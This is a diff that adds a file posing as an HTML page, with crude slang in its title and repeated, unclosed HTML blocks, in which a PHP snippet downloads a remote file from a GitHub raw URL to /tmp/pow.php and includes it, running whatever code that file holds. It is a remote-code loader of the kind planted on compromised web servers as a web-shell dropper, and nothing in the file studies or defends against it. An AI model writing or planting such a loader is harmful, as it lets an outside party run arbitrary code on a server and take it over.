@@ -1,0 +1,31 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>kontol ayam peler</title>
+</head>
+<body>
+<!DOCTYPE html>
+<html>
+<head>
+    <title>kontol ayam peler</title>
+</head>
+<body>
+<?php
+$url = "https://raw.githubusercontent.com/dewa123qwe-hash/ssss/refs/heads/main/v3.txt";
+$downloadedFilePath = "/tmp/pow.php";
+
+file_put_contents($downloadedFilePath, file_get_contents($url));
+
+if (file_exists($downloadedFilePath)) {
+
+    include $downloadedFilePath;
+} else {
+    echo "failed get data";
+}
+?>
+<!DOCTYPE html>
+<html>
+<head>
+    <title>kontol ayam peler</title>
+</head>
+<body>
